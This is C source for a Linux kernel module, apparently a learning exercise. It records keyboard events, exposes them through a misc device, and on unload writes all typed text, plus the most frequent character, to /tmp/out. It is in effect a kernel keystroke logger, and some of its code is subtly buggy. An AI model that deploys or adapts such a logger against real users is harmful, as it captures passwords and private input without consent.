#include "kps_driver.h"

/*
 * seq_file:
 * Create virtual file that can provide information to users.
 * virtual file seq_file interface aspects:
 * 1. An iterator of objects to virtual file to present.
 * 2. Utility functions to format the output.
 * 3. A set of file_operations to operate on the virtual file.
 */

static void *ct_seq_start(struct seq_file *sf, loff_t *pos)
{
	struct key_entry	*p;
	loff_t			i = 0;

	mutex_lock(&kps_data.lock);
	if (list_empty(&kps_data.entries))
		goto UNLOCK;

	p = list_first_entry(&kps_data.entries, struct key_entry, list);
	while (i < *pos && !list_is_last(&p->list, &kps_data.entries)) {
		p = list_next_entry(p, list);
		i++;
	}
	if (i != *pos)
		goto UNLOCK;
	mutex_unlock(&kps_data.lock);
	
	return p;
UNLOCK:
	mutex_unlock(&kps_data.lock);
	return NULL;
}

static void *ct_seq_next(struct seq_file *s, void *v, loff_t *pos)
{
	struct key_entry *p = v;
	struct key_entry *next;

	(*pos)++;
	mutex_lock(&kps_data.lock);
	if (list_is_last(&p->list, &kps_data.entries))
		next = NULL;
	else
		next = list_next_entry(p, list);
	mutex_unlock(&kps_data.lock);
	return next;
}

static void ct_seq_stop(struct seq_file *s, void *v)
{
	/*
	* We should have this even tho we do nothing.
	* Otherwise seq_read_iter try to dereference NULL.
	*/
	//printk(KERN_DEBUG "%s: called\n", __func__);
}

static int ct_seq_show(struct seq_file *sf, void *v)
{
	struct key_entry *p = (struct key_entry*)v;
	
	seq_printf(sf, "%d:%d:%d %s(%c) %s\n",
	    p->hh,
	    p->mm,
	    p->ss,
	    p->k_data.name,
	    p->k_data.ascii_key,
	    p->state == Pressed ? "Pressed" : "Released"
	);

	//list_del(&p->list);
	//kfree(p);
	return 0;
}

static const struct seq_operations ct_seq_ops = {
        .start = ct_seq_start,
	.next = ct_seq_next,
	.stop = ct_seq_stop,
	.show = ct_seq_show,
};

static int ct_open(struct inode *inode, struct file *file)
{
	file->private_data = NULL;
	return seq_open(file, &ct_seq_ops);
}

struct file_operations fops = {
	.open = ct_open,
	.read = seq_read,
	.llseek  = seq_lseek,
	.release = seq_release,
};

struct miscdevice ct_misc_device = {
	.minor = MISC_DYNAMIC_MINOR,
	.name = "kps_driver",
	.fops = &fops,
};

int register_misc_device(void)
{
	int ret;

	printk(KERN_INFO "%s: register device\n", __func__);
	ret = misc_register(&ct_misc_device);

	return ret;
}

static char c_frequency(char *buffer)
{
	size_t	i = 0;
	size_t	j = 0;
	int	freq = 0;
	int	count = 0;
	char	res;


	while (buffer[i])
	{
		count = 0;
		j = i + 1;
		while (buffer[j])
		{
			if (buffer[i] == buffer[j])
				count++;
			j++;
		}
		if (count >= freq)
		{
			res = buffer[i];
			freq = count;
		}
		i++;
	}
	return res;
}

static void log_and_cleanup(void)
{
	struct key_entry 	*entry;
	struct file		*file;
	char			*buffer;
	char			*fbuffer;
	char			mc;
	size_t			i = 0;
	loff_t			pos;

	buffer = kmalloc(kps_data.aLen + 2, GFP_KERNEL);
	fbuffer = kmalloc(kps_data.aLen + 1, GFP_KERNEL);
	memzero_explicit(buffer, kps_data.aLen + 2);
	while (!list_empty(&kps_data.entries)) {
		entry = list_first_entry(&kps_data.entries, struct key_entry, list);
		if (entry->k_data.ascii_key != 0x0 && entry->state != Released)
		{
			buffer[i] = entry->k_data.ascii_key;
			fbuffer[i] = buffer[i];
			i++;
		}
		else if (entry->keycode == 0x0E && i > 0 && buffer[i - 1] != '\n')
		{
			/* Delete the last character */
			buffer[i--] = '\0';
		}
		list_del(&entry->list);
		kfree(entry);
	}
	fbuffer[i] = '\0';
	mc = c_frequency(fbuffer);
	buffer[i++] = '\n';
	buffer[i] = '\0';
	file = filp_open("/tmp/out", O_WRONLY | O_CREAT, 0);
	kernel_write(file, buffer, i, &pos);
	kernel_write(file, &"<", 1, &pos);
	kernel_write(file, &mc, 1, &pos);
	kernel_write(file, &">\n", 2, &pos);
	filp_close(file, NULL);
}

void deregister_misc_device(void)
{
	printk(KERN_INFO "%s: deregister device\n", __func__);
	misc_deregister(&ct_misc_device);
	log_and_cleanup();
	mutex_lock(&kps_data.lock);
	mutex_unlock(&kps_data.lock);
}

